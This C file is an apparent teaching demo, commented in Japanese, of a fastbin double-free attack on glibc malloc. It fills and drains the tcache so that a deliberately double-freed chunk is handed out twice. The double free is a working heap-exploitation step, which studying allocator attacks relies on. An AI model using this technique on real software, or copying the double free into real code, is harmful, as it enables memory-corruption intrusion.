#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("このファイルは、fastbin に対する単純なdouble free (double-free) 攻撃を示します。\n");

	printf("tcache を埋めて fastbin を準備するためにバッファを確保します。\n");
	void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("バッファを 3 つ確保します。\n");
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);
	printf("1 回目の malloc(8): %p\n", a);
	printf("2 回目の malloc(8): %p\n", b);
	printf("3 回目の malloc(8): %p\n", c);

	printf("tcache を埋めます。\n");
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	printf("最初のチャンク %p を解放します...\n", a);
	free(a);

	printf("%p をもう一度解放すると、%p がfree list の先頭にあるためクラッシュします。\n", a, a);
	// free(a);

	printf("そこで、代わりに %p を解放します。\n", b);
	free(b);

	printf("これで、%p はfree listの先頭ではないので、もう一度解放できます。\n", a);
	/* VULNERABILITY */
	free(a);
	/* VULNERABILITY */

	printf("free listを使って確保するには、tcache を空にする必要があります。\n");
	printf("これは、glibc-2.41 以降では tcache を使い切らないと fastbin に到達できないためです。");
	printf("このパッチによる変更です: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=226e3b0a413673c0d6691a0ae6dd001fe05d21cd");
	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("これでfree listは [ %p, %p, %p ] になりました。3 回 malloc すると、%p が 2 回返ってきます。\n", a, b, a, a);
	puts("なお、glibc 2.41 以降では malloc と calloc は tcache と fastbin の使い方が同じなので、ここで malloc と calloc のどちらを使っても問題ありません。");
	a = malloc(8);
	b = calloc(1, 8);
	c = calloc(1, 8);
	printf("1 回目の malloc(8): %p\n", a);
	printf("2 回目の calloc(1, 8): %p\n", b);
	printf("3 回目の calloc(1, 8): %p\n", c);

	assert(a == c);
}
